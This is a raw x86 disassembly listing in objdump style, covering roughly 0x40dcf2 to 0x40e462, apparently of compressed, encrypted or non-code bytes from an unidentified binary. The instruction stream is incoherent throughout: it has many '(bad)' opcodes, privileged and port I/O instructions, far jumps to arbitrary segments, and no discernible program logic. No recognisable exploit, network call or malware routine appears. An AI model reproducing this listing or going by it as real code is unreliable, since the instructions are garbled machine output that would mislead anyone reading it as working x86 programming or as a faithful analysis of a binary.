  40dcf2:	xchg   ch,cl
  40dcf4:	mov    bh,0xdd
  40dcf6:	mov    esp,0x1830b147
  40dcfb:	stos   DWORD PTR es:[edi],eax
  40dcfc:	mov    cl,0x5a
  40dcfe:	sub    esp,DWORD PTR [edi+0x5a]
  40dd01:	into   
  40dd02:	mov    ah,0xf4
  40dd04:	mov    ebx,0xda21f0ae
  40dd09:	inc    ecx
  40dd0a:	inc    eax
  40dd0b:	in     eax,dx
  40dd0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd0d:	mov    WORD PTR [edx+0x719b313],es
  40dd13:	(bad)  
  40dd14:	cs mov ebx,0xec8120a2
  40dd1a:	fld    DWORD PTR [ebx+0x14e301b]
  40dd20:	test   eax,0xce9cb1dc
  40dd25:	out    0xa0,al
  40dd27:	mov    BYTE PTR [esp+edx*1+0x534403bb],bh
  40dd2e:	adc    DWORD PTR [ebx-0xacc53b3],ebx
  40dd34:	in     al,dx
  40dd35:	sub    al,0x2a
  40dd37:	pop    ecx
  40dd38:	jmp    0x4e6001f7
  40dd3d:	shl    BYTE PTR ds:0xbd3284c,1
  40dd43:	dec    eax
  40dd44:	push   ds
  40dd45:	shl    BYTE PTR [esi-0x70d5c6d1],cl
  40dd4b:	cdq    
  40dd4c:	les    edi,FWORD PTR [ebp+0x3afa72d1]
  40dd52:	jno    0x40dd44
  40dd54:	pop    esi
  40dd55:	mov    dh,0x2a
  40dd57:	cmc    
  40dd58:	adc    eax,0xddc81920
  40dd5d:	inc    eax
  40dd5e:	jne    0x40dd12
  40dd60:	loopne 0x40dd63
  40dd62:	mov    ecx,0x786b4b47
  40dd67:	call   0xaf4c5e16
  40dd6c:	inc    esp
  40dd6d:	cmp    dh,dh
  40dd6f:	push   ebx
  40dd70:	imul   edi,DWORD PTR [ebx+0x71c0e10b],0x4f59c45c
  40dd7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd7b:	scas   eax,DWORD PTR es:[edi]
  40dd7c:	div    BYTE PTR ds:0xfb3a4658
  40dd82:	xchg   DWORD PTR [ebp-0x5e0c0890],edx
  40dd88:	pop    edx
  40dd89:	adc    eax,0x24269e78
  40dd8e:	add    BYTE PTR [ecx+0x60],dl
  40dd91:	ins    DWORD PTR es:[edi],dx
  40dd92:	(bad)  
  40dd93:	ficom  DWORD PTR [ecx]
  40dd95:	push   0xfaef999b
  40dd9a:	and    DWORD PTR [eax],esi
  40dd9c:	f2xm1  
  40dd9e:	xlat   BYTE PTR ds:[ebx]
  40dd9f:	call   0xd756:0x46c440b2
  40dda6:	jns    0x40ddd6
  40dda8:	and    BYTE PTR [eax+0xd],bh
  40ddab:	test   DWORD PTR [ebp+eax*2+0x7d38b554],ecx
  40ddb2:	sub    dh,BYTE PTR [edi+0x69]
  40ddb5:	call   0x299f:0xcfe7a4eb
  40ddbc:	es loope 0x40de0f
  40ddbf:	cmp    al,0x4f
  40ddc1:	sub    dh,BYTE PTR [ebx+ebp*4]
  40ddc4:	iret   
  40ddc5:	mov    ebp,0xe965bbbf
  40ddca:	mov    bh,0x67
  40ddcc:	pushf  
  40ddcd:	lods   eax,DWORD PTR ds:[esi]
  40ddce:	gs and eax,0xa63a55b6
  40ddd4:	xchg   esp,eax
  40ddd5:	out    dx,eax
  40ddd6:	push   edi
  40ddd7:	stos   BYTE PTR es:[edi],al
  40ddd8:	retfw  
  40ddda:	push   edx
  40dddb:	and    BYTE PTR fs:[ebx-0x5364bddd],0x39
  40dde3:	mov    ss,ecx
  40dde5:	pop    eax
  40dde6:	mov    ebp,0xb1156f16
  40ddeb:	rol    al,1
  40dded:	ins    BYTE PTR es:[edi],dx
  40ddee:	aad    0x15
  40ddf0:	jnp    0x40dde3
  40ddf2:	push   es
  40ddf3:	cs loope 0x40de65
  40ddf6:	leave  
  40ddf7:	leave  
  40ddf8:	repz retf 0x87c
  40ddfc:	or     ebp,DWORD PTR [edx-0x5]
  40ddff:	mov    dh,0x9b
  40de01:	mov    DWORD PTR [eax+0x36],ebp
  40de04:	add    al,0x9e
  40de06:	sub    DWORD PTR [edi+0x6e],esi
  40de09:	push   ds
  40de0a:	push   esp
  40de0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de0c:	clc    
  40de0d:	fdivrp st(7),st
  40de0f:	inc    BYTE PTR [eax-0x6d397b49]
  40de15:	mov    ch,0x56
  40de17:	sub    eax,0x906a4720
  40de1c:	popa   
  40de1d:	pop    edx
  40de1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de1f:	and    cl,BYTE PTR [edi-0x7a]
  40de22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de23:	inc    esi
  40de24:	sete   BYTE PTR [edi+0x7c32df72]
  40de2b:	popa   
  40de2c:	push   0xa6aec014
  40de31:	std    
  40de32:	test   DWORD PTR [eax],edx
  40de34:	fdiv   QWORD PTR [ebp+0x468f0dcf]
  40de3a:	fiadd  DWORD PTR [ebx-0x1308fc8]
  40de40:	jne    0x40de61
  40de42:	and    edx,ebx
  40de44:	sbb    al,0xb7
  40de46:	lahf   
  40de47:	jo     0x40deaa
  40de49:	cld    
  40de4a:	ins    DWORD PTR es:[edi],dx
  40de4b:	mov    dh,0x5a
  40de4d:	push   esi
  40de4e:	pop    ss
  40de4f:	adc    DWORD PTR [eax+0xb91286d],ecx
  40de55:	sbb    eax,edx
  40de57:	mov    dh,0x52
  40de59:	jp     0x40dec7
  40de5b:	or     ah,BYTE PTR [edi]
  40de5d:	out    0xc1,eax
  40de5f:	shr    DWORD PTR [edi],1
  40de61:	es rol ecx,1
  40de64:	int3   
  40de65:	xor    bl,cl
  40de67:	jns    0x40de91
  40de69:	dec    esi
  40de6a:	test   DWORD PTR [ecx-0x74],ebx
  40de6d:	push   0x1e4ef7b
  40de72:	xor    dh,0x7e
  40de75:	movsx  ebx,WORD PTR [edx]
  40de78:	popa   
  40de79:	imul   esp,DWORD PTR [edx+0x4321508b],0x216dea4e
  40de83:	ins    DWORD PTR es:[edi],dx
  40de84:	push   ds
  40de85:	push   0x5027b109
  40de8a:	xchg   eax,edx
  40de8c:	int    0x73
  40de8e:	jnp    0x40dec8
  40de90:	cmc    
  40de91:	bswap  eax
  40de93:	das    
  40de94:	pop    ss
  40de95:	dec    ebp
  40de96:	in     al,dx
  40de97:	pop    ebp
  40de98:	inc    ecx
  40de99:	mov    cl,0x55
  40de9b:	push   eax
  40de9c:	push   ebp
  40de9d:	ins    DWORD PTR es:[edi],dx
  40de9e:	mul    DWORD PTR [ebp+ebx*1+0x3d]
  40dea2:	cmp    bl,BYTE PTR [ebx+esi*8+0x74]
  40dea6:	add    DWORD PTR ds:0x8057862f,edx
  40deac:	lds    eax,FWORD PTR [esi-0x76]
  40deaf:	cmp    al,bl
  40deb1:	pop    ebx
  40deb2:	test   eax,0x12cadabf
  40deb7:	pop    esp
  40deb8:	(bad)  
  40deb9:	fidiv  WORD PTR [eax+0x4e]
  40debc:	in     al,dx
  40debd:	jl     0x40df3a
  40debf:	sbb    DWORD PTR [ebx+0x6a],ecx
  40dec2:	add    dl,dh
  40dec4:	jno    0x40dedf
  40dec6:	jmp    FWORD PTR fs:[edx-0x48]
  40deca:	stos   BYTE PTR es:[edi],al
  40decb:	std    
  40decc:	loop   0x40de78
  40dece:	mov    ds:0x9ff2fee2,eax
  40ded3:	push   eax
  40ded4:	test   DWORD PTR [ebp-0x58],ebx
  40ded7:	jmp    0x40df33
  40ded9:	push   edi
  40deda:	sbb    dl,BYTE PTR [ebx+0x212cd913]
  40dee0:	push   ebp
  40dee1:	aad    0x3c
  40dee3:	iret   
  40dee4:	ret    
  40dee5:	data16 test al,0xfe
  40dee8:	dec    esp
  40dee9:	pop    es
  40deea:	jle    0x40decb
  40deec:	add    eax,0xeeb544a7
  40def1:	pop    ebx
  40def2:	jne    0x40de87
  40def4:	dec    edi
  40def5:	test   DWORD PTR [esp+eax*4+0x5bb6fce],edx
  40defc:	into   
  40defd:	rcl    DWORD PTR [ebx-0x2b064e27],cl
  40df03:	call   0x17c8:0x65e4961
  40df0a:	xor    BYTE PTR [esi+eiz*4+0x57],cl
  40df0e:	inc    ecx
  40df0f:	sub    BYTE PTR [ebx+0x6f39c1e],cl
  40df15:	stc    
  40df16:	iret   
  40df17:	and    al,0xd7
  40df19:	out    0x44,eax
  40df1b:	jle    0x40dec5
  40df1d:	out    0xd9,eax
  40df1f:	retf   0x59ea
  40df22:	gs mov al,0x56
  40df25:	sbb    eax,0xda18d404
  40df2a:	xchg   edx,eax
  40df2b:	mul    DWORD PTR [eax+0xd]
  40df2e:	mov    eax,DWORD PTR [esi-0x6b]
  40df31:	out    dx,eax
  40df32:	push   cs
  40df33:	push   edi
  40df34:	test   al,0xc6
  40df36:	jmp    0xd95c:0x4890c462
  40df3d:	push   ds
  40df3e:	or     esp,DWORD PTR [edi-0xa5e78a8]
  40df44:	fwait
  40df45:	mov    esp,esi
  40df47:	add    eax,0xea7f8edf
  40df4c:	or     eax,0x5cfbe4fd
  40df51:	push   ebx
  40df52:	add    ah,BYTE PTR [ebx-0x7cb39660]
  40df58:	dec    esi
  40df59:	test   eax,0xfc1b7686
  40df5e:	dec    ebp
  40df5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df60:	orps   xmm7,XMMWORD PTR [eax-0x77]
  40df64:	ins    DWORD PTR es:[edi],dx
  40df65:	scas   al,BYTE PTR es:[edi]
  40df66:	mov    cl,0xa9
  40df68:	pusha  
  40df69:	call   0xba11d12b
  40df6e:	dec    edx
  40df6f:	pop    ds
  40df70:	sbb    ebp,DWORD PTR [ebx-0x1066fa7c]
  40df76:	sbb    ecx,DWORD PTR ds:0xb93a0bf4
  40df7c:	cmc    
  40df7d:	ja     0x40dfd5
  40df7f:	push   edx
  40df80:	fldenv [ebp+eax*4+0x18dd87b6]
  40df87:	jmp    0x2240:0x301f37b2
  40df8e:	cmp    DWORD PTR ds:0x78f2f501,esp
  40df94:	in     eax,dx
  40df95:	test   eax,0x81687df3
  40df9a:	scas   al,BYTE PTR es:[edi]
  40df9b:	xchg   esp,eax
  40df9c:	or     eax,DWORD PTR [eax+0x412df999]
  40dfa2:	cmp    cl,BYTE PTR [esi+0x69e617e7]
  40dfa8:	mov    esi,0x2b2b4cb8
  40dfad:	mov    dh,0xf6
  40dfaf:	adc    BYTE PTR [eax+0x7b4c387b],dh
  40dfb5:	or     BYTE PTR [edi],cl
  40dfb7:	cmp    ecx,ebp
  40dfb9:	cmp    al,0xd4
  40dfbb:	mov    dh,0xbf
  40dfbd:	dec    esi
  40dfbe:	inc    ecx
  40dfbf:	fsubr  QWORD PTR [ebx-0x33]
  40dfc2:	scas   al,BYTE PTR es:[edi]
  40dfc3:	stos   DWORD PTR es:[edi],eax
  40dfc4:	xor    al,0x43
  40dfc6:	sahf   
  40dfc7:	aas    
  40dfc8:	mov    ah,0x79
  40dfca:	mov    ?,WORD PTR [edi+0x679e1c51]
  40dfd0:	pop    ecx
  40dfd1:	pushf  
  40dfd2:	(bad)  
  40dfd3:	mov    al,0xe
  40dfd5:	test   ah,dh
  40dfd7:	push   0xffffff87
  40dfd9:	jno    0x40e019
  40dfdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfdc:	shl    WORD PTR [ebx],0x62
  40dfe0:	mov    ebx,0xb5de3e7a
  40dfe5:	xor    eax,0x9a7d2ea5
  40dfea:	out    dx,eax
  40dfeb:	mov    edi,0x932a0fc1
  40dff0:	loope  0x40e061
  40dff2:	inc    ebx
  40dff3:	inc    ebx
  40dff4:	sub    bh,dh
  40dff6:	push   esp
  40dff7:	add    eax,0x8b039d38
  40dffc:	push   ebx
  40dffd:	icebp  
  40dffe:	push   DWORD PTR [esi-0x3cd94b46]
  40e004:	jle    0x40e022
  40e006:	mov    edi,0xdc212a5b
  40e00b:	mov    edx,0x9602d05c
  40e010:	push   edi
  40e011:	sar    BYTE PTR [eax],0x77
  40e014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e015:	repz mov al,ds:0x126994a4
  40e01b:	mov    ds:0xb4886f93,al
  40e020:	sbb    al,0xc6
  40e022:	sub    eax,0x17b880d5
  40e027:	jo     0x40dfce
  40e029:	ins    BYTE PTR es:[edi],dx
  40e02a:	add    eax,0xd0e949f0
  40e02f:	jno    0x40e00f
  40e031:	stos   BYTE PTR es:[edi],al
  40e032:	(bad)  
  40e033:	in     al,dx
  40e034:	sub    al,0x8c
  40e036:	mov    dh,0x2a
  40e038:	xlat   BYTE PTR ds:[ebx]
  40e039:	sub    al,0x3
  40e03b:	push   esi
  40e03c:	push   ecx
  40e03d:	cwde   
  40e03e:	and    al,0x9a
  40e040:	add    DWORD PTR [esi-0x3bdcb5],edx
  40e046:	and    ebp,DWORD PTR [ebp+esi*1-0x4b]
  40e04a:	mov    dl,0xd8
  40e04c:	(bad)  
  40e04e:	stos   BYTE PTR es:[edi],al
  40e04f:	fwait
  40e050:	jecxz  0x40e07b
  40e052:	inc    eax
  40e053:	(bad)  
  40e054:	inc    ebp
  40e055:	fimul  DWORD PTR [edx]
  40e057:	push   esp
  40e058:	das    
  40e059:	scas   eax,DWORD PTR es:[edi]
  40e05a:	push   ds
  40e05b:	sbb    eax,0xdc6a1c46
  40e061:	shr    BYTE PTR [ecx-0x1772901],1
  40e067:	in     al,0xc2
  40e069:	push   ds
  40e06a:	sub    al,0x70
  40e06c:	mov    db6,esi
  40e06f:	dec    bh
  40e071:	dec    esp
  40e072:	cli    
  40e073:	cmp    BYTE PTR [edx-0x679604b3],dh
  40e079:	lahf   
  40e07a:	push   ecx
  40e07b:	jns    0x40e016
  40e07d:	jp     0x40e00a
  40e07f:	shr    DWORD PTR [eax],cl
  40e081:	ds add eax,0xa9320e00
  40e087:	add    dh,cl
  40e089:	sar    DWORD PTR [edx],cl
  40e08b:	lods   al,BYTE PTR ds:[esi]
  40e08c:	cmc    
  40e08d:	in     eax,dx
  40e08e:	(bad)  
  40e08f:	ins    BYTE PTR es:[edi],dx
  40e090:	aad    0x41
  40e092:	scas   al,BYTE PTR es:[edi]
  40e093:	add    ecx,DWORD PTR [ecx+0x3f]
  40e096:	rdmsr  
  40e098:	mov    al,0x61
  40e09a:	outs   dx,DWORD PTR ds:[esi]
  40e09b:	pop    ebx
  40e09c:	and    eax,0xc6d1153e
  40e0a1:	cmp    ah,0x71
  40e0a4:	fwait
  40e0a5:	jb     0x40e0ff
  40e0a7:	push   edi
  40e0a8:	inc    ebx
  40e0a9:	xchg   esi,eax
  40e0aa:	int3   
  40e0ab:	mov    al,0xcb
  40e0ad:	pop    ss
  40e0ae:	dec    edi
  40e0af:	(bad)  
  40e0b1:	adc    BYTE PTR [ebx+0x2f115de0],0x43
  40e0b8:	sub    dh,BYTE PTR [eax]
  40e0ba:	mov    edi,0xdc3bd0a
  40e0bf:	or     dh,bl
  40e0c1:	pop    ecx
  40e0c2:	imul   ebp,eax,0xaba90916
  40e0c8:	(bad)
  40e0cb:	pop    edx
  40e0cc:	pop    edx
  40e0cd:	sub    al,0xeb
  40e0cf:	push   eax
  40e0d0:	xor    DWORD PTR [esi],ebp
  40e0d2:	and    eax,0x357bf88d
  40e0d7:	std    
  40e0d8:	jnp    0x40e05e
  40e0da:	or     edx,DWORD PTR [ebx-0x25]
  40e0dd:	cdq    
  40e0de:	popa   
  40e0df:	cdq    
  40e0e0:	jp     0x40e15d
  40e0e2:	es push esp
  40e0e4:	(bad)  
  40e0e5:	out    dx,al
  40e0e6:	int    0x9c
  40e0e8:	jno    0x40e0ea
  40e0ea:	mov    bl,0xdd
  40e0ec:	and    BYTE PTR [ebp+0x17],bl
  40e0ef:	clc    
  40e0f0:	adc    DWORD PTR [esp+ebx*8],eax
  40e0f3:	pop    ecx
  40e0f4:	scas   eax,DWORD PTR es:[edi]
  40e0f5:	not    DWORD PTR [ecx-0x216fa1d6]
  40e0fb:	mov    dl,0x5a
  40e0fd:	or     BYTE PTR [edi-0x7e69e37d],dh
  40e103:	mov    eax,ss
  40e105:	mov    DWORD PTR [esp+ebx*1+0x11],ebx
  40e109:	or     BYTE PTR [edx],dh
  40e10b:	mov    DWORD PTR [eax+0x3b0dc918],ecx
  40e111:	jle    0x40e0f8
  40e113:	sar    BYTE PTR [edx],0xe
  40e116:	pop    ecx
  40e117:	inc    edi
  40e118:	jb     0x40e145
  40e11a:	popf   
  40e11b:	cmp    esp,DWORD PTR [ecx+ebp*8]
  40e11e:	or     al,0x76
  40e120:	jno    0x40e15b
  40e122:	or     eax,0x661d12e2
  40e127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e128:	mov    dh,0x4f
  40e12a:	ficomp WORD PTR [ebp+0x35b4a5]
  40e130:	stos   DWORD PTR es:[edi],eax
  40e131:	div    esi
  40e133:	pushf  
  40e134:	(bad)  
  40e135:	jge    0x40e0ec
  40e137:	cmp    DWORD PTR [esp+ebp*8-0x799b9996],0xa8b30bf2
  40e142:	lahf   
  40e143:	fldenv [edx]
  40e145:	or     DWORD PTR [esi+0x13928cc9],edi
  40e14b:	outs   dx,BYTE PTR ds:[esi]
  40e14c:	sbb    dh,BYTE PTR [esi]
  40e14e:	cli    
  40e14f:	rcr    edi,cl
  40e151:	mov    dh,0x9d
  40e153:	mov    bh,0x4b
  40e155:	cmp    bh,BYTE PTR [ebx]
  40e157:	or     bh,BYTE PTR [edi+0x74]
  40e15a:	into   
  40e15b:	in     eax,0xf7
  40e15d:	sbb    eax,0xc1fd2043
  40e162:	inc    ecx
  40e163:	(bad)  
  40e164:	dec    edi
  40e165:	ss sub al,0x33
  40e168:	clc    
  40e169:	scas   eax,DWORD PTR es:[edi]
  40e16a:	or     esi,DWORD PTR [edi+eax*4]
  40e16d:	push   cs
  40e16e:	cmc    
  40e16f:	pop    esi
  40e170:	xchg   ah,al
  40e172:	mov    dl,0x2f
  40e174:	es pushf 
  40e176:	outs   dx,BYTE PTR ds:[esi]
  40e177:	lds    ecx,FWORD PTR [eax+esi*1]
  40e17a:	out    0x61,eax
  40e17c:	pop    es
  40e17d:	fucomp st(3)
  40e17f:	call   0x1b92f565
  40e184:	int    0x42
  40e186:	jg     0x40e134
  40e188:	loopne 0x40e1fc
  40e18a:	sbb    al,0xf7
  40e18c:	js     0x40e17a
  40e18e:	fidivr DWORD PTR [esp+ecx*4-0x52fbfcbf]
  40e195:	and    al,0x85
  40e197:	dec    ebx
  40e198:	sub    eax,0xf9daa01e
  40e19d:	or     BYTE PTR [esi+0x5bcdb43c],ch
  40e1a3:	cli    
  40e1a4:	xor    bh,BYTE PTR [eax]
  40e1a6:	mov    WORD PTR [ebx],gs
  40e1a8:	ds mov edx,0x9eff4471
  40e1ae:	xchg   dh,dl
  40e1b0:	or     DWORD PTR [ebx-0x2e],edx
  40e1b3:	jmp    0x40e217
  40e1b5:	test   DWORD PTR [ecx-0x63],esi
  40e1b8:	adc    al,0xc
  40e1ba:	bound  ebx,QWORD PTR [eax+0x6e6f56e8]
  40e1c0:	je     0x40e21d
  40e1c2:	cs jb  0x40e1a6
  40e1c5:	pop    esi
  40e1c6:	imul   esp,ebx,0x3e93ef8e
  40e1cc:	mov    eax,gs
  40e1ce:	fs hlt 
  40e1d0:	mov    bl,dl
  40e1d2:	push   ecx
  40e1d3:	scas   al,BYTE PTR es:[edi]
  40e1d4:	xor    edi,eax
  40e1d6:	mov    dh,0xaf
  40e1d8:	push   ebx
  40e1d9:	iret   
  40e1da:	cmp    esi,DWORD PTR [bx+di]
  40e1dd:	fwait
  40e1de:	(bad)  
  40e1df:	out    dx,eax
  40e1e0:	adc    eax,0xeb3ae738
  40e1e5:	int    0x38
  40e1e7:	jp     0x40e169
  40e1e9:	and    edi,DWORD PTR [edx]
  40e1eb:	rcr    edi,cl
  40e1ed:	cmp    eax,eax
  40e1ef:	pop    ebx
  40e1f0:	clc    
  40e1f1:	stos   DWORD PTR es:[edi],eax
  40e1f2:	fdiv   QWORD PTR [eax+0x7a9e388f]
  40e1f8:	int    0x3a
  40e1fa:	sbb    BYTE PTR [edx+0x54cf8e6e],al
  40e200:	arpl   sp,bx
  40e202:	sbb    al,0x23
  40e204:	dec    edx
  40e205:	bound  ebp,QWORD PTR [ecx-0x356e0f1c]
  40e20b:	dec    edi
  40e20c:	dec    esp
  40e20d:	and    BYTE PTR [ebp-0xd],ch
  40e210:	repz test BYTE PTR [edi+ebp*1-0x4fad80b8],0x1f
  40e219:	jp     0x40e244
  40e21b:	mov    ecx,0x597d07fb
  40e220:	pop    edx
  40e221:	std    
  40e222:	or     ah,dl
  40e224:	es or  al,0xe2
  40e227:	jge    0x40e1d9
  40e229:	call   0x48329227
  40e22e:	xchg   edi,eax
  40e22f:	jo     0x40e257
  40e231:	(bad)  
  40e232:	fs ins DWORD PTR es:[edi],dx
  40e234:	or     DWORD PTR [ecx+0x6f],edx
  40e237:	cwde   
  40e238:	add    DWORD PTR [ecx+0x48220e4],ebx
  40e23e:	out    0xd9,al
  40e240:	loopne 0x40e266
  40e242:	xlat   BYTE PTR ds:[ebx]
  40e243:	test   ax,0x61ad
  40e247:	inc    edx
  40e248:	xchg   ebp,eax
  40e249:	mov    DWORD PTR [edx],ebp
  40e24b:	fs push es
  40e24d:	sbb    DWORD PTR [edi-0x8],esp
  40e250:	lods   al,BYTE PTR ds:[esi]
  40e251:	ret    
  40e252:	xchg   BYTE PTR [esi],cl
  40e254:	hlt    
  40e255:	mov    esi,0xd51847db
  40e25a:	xchg   edi,eax
  40e25b:	xor    al,0x52
  40e25d:	loope  0x40e2a7
  40e25f:	or     bh,BYTE PTR ss:[ebx]
  40e262:	pop    ss
  40e263:	xchg   al,al
  40e265:	pop    esi
  40e266:	push   ebp
  40e267:	cmp    edi,0xffffffd7
  40e26a:	fnstcw WORD PTR ds:0xb796da54
  40e270:	and    al,0x88
  40e272:	not    DWORD PTR [eax+0x4013247c]
  40e278:	jge    0x40e2a5
  40e27a:	jns    0x40e298
  40e27c:	adc    eax,0xcf6a7394
  40e281:	hlt    
  40e282:	int    0x91
  40e284:	scas   al,BYTE PTR es:[edi]
  40e285:	outs   dx,DWORD PTR ds:[esi]
  40e286:	or     DWORD PTR [ebp-0x6f],esp
  40e289:	xchg   ecx,eax
  40e28a:	dec    eax
  40e28b:	icebp  
  40e28c:	push   eax
  40e28d:	repnz or DWORD PTR [ebp-0x47],edi
  40e291:	mov    ebx,0x34f4413
  40e296:	test   cl,bh
  40e298:	js     0x40e309
  40e29a:	js     0x7c711492
  40e2a0:	mov    ds:0x60b829ff,eax
  40e2a5:	jp     0x40e2e4
  40e2a7:	cmp    bh,BYTE PTR [esi]
  40e2a9:	ret    
  40e2aa:	mov    dh,0x58
  40e2ac:	xor    DWORD PTR [ecx+0x2bdfc68b],esi
  40e2b2:	add    dh,BYTE PTR [edx-0x6eb46f6c]
  40e2b8:	(bad)  
  40e2b9:	aaa    
  40e2ba:	ins    BYTE PTR es:[edi],dx
  40e2bb:	jge    0x40e2c7
  40e2bd:	mov    al,ds:0xf59b2d92
  40e2c2:	loope  0x40e290
  40e2c4:	mov    dh,0xbe
  40e2c6:	jmp    0x124b:0xa7e8cc45
  40e2cd:	mov    bl,0xbe
  40e2cf:	push   0x35
  40e2d1:	fs mov dl,0xe9
  40e2d4:	mov    ds:0xf5f95923,al
  40e2d9:	mov    eax,ds:0xffedb480
  40e2de:	dec    ecx
  40e2df:	clc    
  40e2e0:	retf   0x3f3a
  40e2e3:	loope  0x40e2d1
  40e2e5:	jne    0x40e35f
  40e2e7:	jb     0x40e34d
  40e2e9:	sub    ecx,DWORD PTR ds:0x9bc37614
  40e2ef:	sti    
  40e2f0:	(bad)  
  40e2f2:	push   ebp
  40e2f3:	xchg   DWORD PTR [ecx+0x769d5b46],esi
  40e2f9:	jb     0x40e2c9
  40e2fb:	dec    eax
  40e2fc:	push   ebp
  40e2fd:	fcmovu st,st(6)
  40e2ff:	(bad)  
  40e300:	std    
  40e301:	xchg   DWORD PTR [edi+0xf],eax
  40e304:	mov    ch,0xba
  40e307:	and    ecx,DWORD PTR [eax+0x3e]
  40e30a:	in     eax,0xa7
  40e30c:	stos   DWORD PTR es:[edi],eax
  40e30d:	push   edx
  40e30e:	dec    edx
  40e30f:	pop    ebp
  40e310:	push   0x5240f409
  40e315:	repz adc dh,bh
  40e318:	adc    DWORD PTR [edi+0x3a],edx
  40e31b:	ret    0x6685
  40e31e:	mov    edi,0xad7accf1
  40e323:	push   edi
  40e324:	lods   eax,DWORD PTR ds:[esi]
  40e325:	mov    ebp,ebx
  40e327:	pop    ss
  40e328:	aam    0x83
  40e32a:	or     BYTE PTR ds:0x649273e7,ah
  40e330:	fld    TBYTE PTR [esi]
  40e332:	and    al,0xd
  40e334:	pop    ecx
  40e335:	das    
  40e336:	xchg   DWORD PTR [eax],esp
  40e338:	cmp    BYTE PTR [ebx],bl
  40e33a:	add    al,0x32
  40e33c:	mov    DWORD PTR [ecx+0x5554905d],edi
  40e342:	pusha  
  40e343:	aaa    
  40e344:	dec    edi
  40e345:	xchg   BYTE PTR [ebp+0x556b5ee2],bl
  40e34b:	fcmovb st,st(6)
  40e34d:	sbb    al,0x75
  40e34f:	nop
  40e350:	sub    al,BYTE PTR [ebx+0x3aa6f461]
  40e356:	mov    eax,ds:0x4dc32a6
  40e35b:	fnsave [ecx-0x6e]
  40e35e:	(bad)  
  40e360:	add    cl,BYTE PTR [edi+0x36]
  40e363:	retf   0xe7bf
  40e366:	xchg   edx,edi
  40e368:	fs sub eax,0x91589088
  40e36e:	push   esi
  40e36f:	push   edi
  40e370:	frstor [edx+edx*2-0x31]
  40e374:	out    0xe2,eax
  40e376:	(bad)
  40e37a:	sub    al,0x4f
  40e37c:	mov    cl,0xa0
  40e37e:	in     eax,dx
  40e37f:	dec    ebx
  40e380:	xlat   BYTE PTR ds:[ebx]
  40e381:	and    al,0x37
  40e383:	xor    al,0x2d
  40e385:	pop    eax
  40e386:	enter  0x1951,0x61
  40e38a:	or     BYTE PTR [edi],dh
  40e38c:	push   DWORD PTR [ecx+0x69]
  40e38f:	sub    esp,DWORD PTR [esi-0x5]
  40e392:	push   ecx
  40e393:	repz xlat BYTE PTR ds:[ebx]
  40e395:	xchg   cx,ax
  40e397:	mov    bl,BYTE PTR [ebx+0x7b]
  40e39a:	jae    0x40e397
  40e39c:	dec    edx
  40e39d:	sbb    edi,DWORD PTR [edx]
  40e39f:	and    al,0xae
  40e3a1:	fisttp WORD PTR [ebp-0x67]
  40e3a4:	sbb    bl,BYTE PTR [ebx+0x23]
  40e3a7:	pop    esp
  40e3a8:	in     eax,0xbe
  40e3aa:	scas   eax,DWORD PTR es:[edi]
  40e3ab:	mov    bl,BYTE PTR [esi-0x38d02bfa]
  40e3b1:	arpl   WORD PTR [esi-0x59c887d5],cx
  40e3b7:	add    al,0xc2
  40e3b9:	mov    dl,0xe7
  40e3bb:	adc    eax,0xfcb3623f
  40e3c0:	jp     0x40e416
  40e3c2:	inc    ecx
  40e3c3:	lock imul edx,DWORD PTR [edx-0x6eeb18f5],0x291680a7
  40e3ce:	lods   eax,DWORD PTR ds:[esi]
  40e3cf:	pop    edx
  40e3d0:	pop    edi
  40e3d1:	dec    edx
  40e3d2:	mov    ?,WORD PTR [eax+edi*2-0x4c7d6b03]
  40e3d9:	or     BYTE PTR [ebp+0x1b],ch
  40e3dc:	push   ebx
  40e3dd:	cmp    DWORD PTR [edi],ebx
  40e3df:	not    ebp
  40e3e1:	xor    al,0x37
  40e3e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3e4:	retf   0x6977
  40e3e7:	add    edx,ebp
  40e3e9:	cmp    ecx,DWORD PTR [eax]
  40e3eb:	enter  0xd509,0xb8
  40e3ef:	stc    
  40e3f0:	push   esp
  40e3f1:	and    DWORD PTR [eax+0x3f136aa1],edx
  40e3f7:	mov    bh,0x9d
  40e3f9:	inc    eax
  40e3fa:	cmp    BYTE PTR [ecx],ah
  40e3fc:	add    ebp,DWORD PTR fs:[edi]
  40e3ff:	push   ds
  40e400:	mov    ch,0x24
  40e402:	pop    ds
  40e403:	sbb    esi,ebx
  40e405:	or     DWORD PTR [edi+esi*8-0x5bb9f47e],esi
  40e40c:	sub    bl,BYTE PTR [edi+esi*1+0x78b072eb]
  40e413:	add    al,0x44
  40e415:	or     al,0x82
  40e417:	sahf   
  40e418:	push   edx
  40e419:	or     ebp,eax
  40e41b:	popa   
  40e41c:	sub    eax,ecx
  40e41e:	sahf   
  40e41f:	pop    esp
  40e420:	xchg   ebp,eax
  40e421:	jg     0x40e47c
  40e423:	bound  esp,QWORD PTR [edx-0x2a]
  40e426:	js     0x40e421
  40e428:	sti    
  40e429:	(bad)  
  40e42a:	cmp    DWORD PTR [eax+ebx*1-0xa5fd6cc],esp
  40e431:	mov    ah,0xc4
  40e433:	enter  0x9498,0x47
  40e437:	cli    
  40e438:	dec    ebp
  40e439:	lods   al,BYTE PTR ds:[esi]
  40e43a:	jge    0x40e3f0
  40e43c:	xchg   edi,eax
  40e43d:	mov    WORD PTR [eax+0x3a15c75e],ss
  40e443:	aad    0xd8
  40e445:	outs   dx,BYTE PTR ds:[esi]
  40e446:	(bad)  
  40e447:	pusha  
  40e448:	push   0xe99f9cc2
  40e44d:	push   es
  40e44e:	dec    ecx
  40e44f:	fsub   QWORD PTR [edi]
  40e451:	jbe    0x40e45c
  40e453:	addr16 and al,0xb6
  40e456:	sub    DWORD PTR ds:0x2246ec63,ebx
  40e45c:	xor    ah,BYTE PTR [ecx]
  40e45e:	xchg   ebx,eax
  40e45f:	add    bl,BYTE PTR [edx-0x45]
  40e462:	imul   edi,edx,0xffffffb2
